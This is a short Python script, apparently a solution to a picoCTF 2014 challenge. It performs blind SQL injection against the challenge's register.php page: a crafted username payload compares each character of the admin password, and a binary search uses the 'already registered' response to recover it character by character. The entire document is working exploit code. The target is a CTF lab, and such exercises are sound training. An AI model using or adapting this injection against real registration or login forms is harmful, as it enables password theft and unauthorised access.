import requests

caractere = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
password = ""

def request_natas( i, op, c ):
    username = "admin' AND char(ascii(substring(password," + str(i) + ",1)))" + op + "'" + c;
    res = requests.post( 'http://web2014.picoctf.com/injection4/register.php', {'username':username} )
    return "Someone has already registered" in res.content

def busca( inicio, final, i ):
    medio = ( inicio + final )/2
    if request_natas( i, '=', caractere[inicio] ):
        return caractere[inicio]
    elif request_natas( i, '=', caractere[final] ):
        return caractere[final]
    elif request_natas( i, '>', caractere[medio] ):
        return busca( medio, final-1, i )
    else:
        return busca( inicio+1, medio, i )

for i in range( 1, 50 ):
    password += busca( 0, len(caractere)-1, i )
    print "Password: " + password